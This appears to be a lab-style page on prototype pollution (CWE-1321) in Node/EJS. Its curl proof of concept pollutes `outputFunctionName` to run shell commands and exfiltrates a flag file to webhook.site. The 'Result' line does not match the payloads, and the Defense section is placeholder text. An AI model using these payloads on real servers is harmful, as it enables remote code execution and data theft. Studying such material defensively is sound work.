---
categories:
  - daily_cwe
title: "CWE-1321: Prototype Pollution"
tags: 
  - CWE-1321
  - prototype pollution
---
# IMPROPERLY CONTROLLED MODIFICATION OF OBJECT PROTOTYPE ATTRIBUTES

Special keys (`__proto__`, `constructor`) can be overriden by user

Impact : Server-Sdie Prototype Pollution (SSPP) with gadget chain (such as `ejs`, `pug`, `child_process`) can lead to RCE

Input : Parameters and Boundaries
Output : Result

## Implementation


### Basic project structure
```
.
├── Dockerfile
├── package.json
├── flag.txt
├── app.js
└── views/
    └── index.ejs
```

Dockerfile

```Dockerfile
--8<-- "docs/daily_cwe/cwe-1321/source/Dockerfile"
```

package.json

```json
--8<-- "docs/daily_cwe/cwe-1321/source/package.json"
```

app.js

```js
--8<-- "docs/daily_cwe/cwe-1321/source/app.js"
```

views/index.ejs

```html
--8<-- "docs/daily_cwe/cwe-1321/source/views/index.ejs"
```

### Deploy

```docker
docker build -t sspp-demo .
docker run -p 3000:3000 sspp-demo
```

### PoC

Step 1 : Sending prototype pollution payload

```sh
curl -i -XPOST http://localhost:3000/api/settings \
     -H "Content-Type: application/json" \
     -d '{
        "__proto__": {
          "outputFunctionName": "x; process.mainModule.require(\"child_process\").execSync(\"cat /flag.txt > /tmp/flag_out.txt\"); //"
        }
     }'
```
Step 2 : Trigger RCE gadget

```sh
curl -i http://localhost:3000/
```

Step 3 : OOB Exfiltration

```sh
curl -i -XPOST http://localhost:3000/api/settings \
     -H "Content-Type: application/json" \
     -d '{
        "__proto__": {
          "outputFunctionName": "x; process.mainModule.require(\"child_process\").execSync(\"curl http://webhook.site/$(cat /flag.txt)\"); //"
        }
     }'
```

Result :
`id > /tmp/pwned` 

### Explanation

EJS (version < **3.1.10**), `render` function using config variable `outputNameFunction`. If this variable is polluteed, EJS does not sanitize, it leads to Code Injection

## Defense

Some explanations based on idea and formula. 

Note some crazy ideas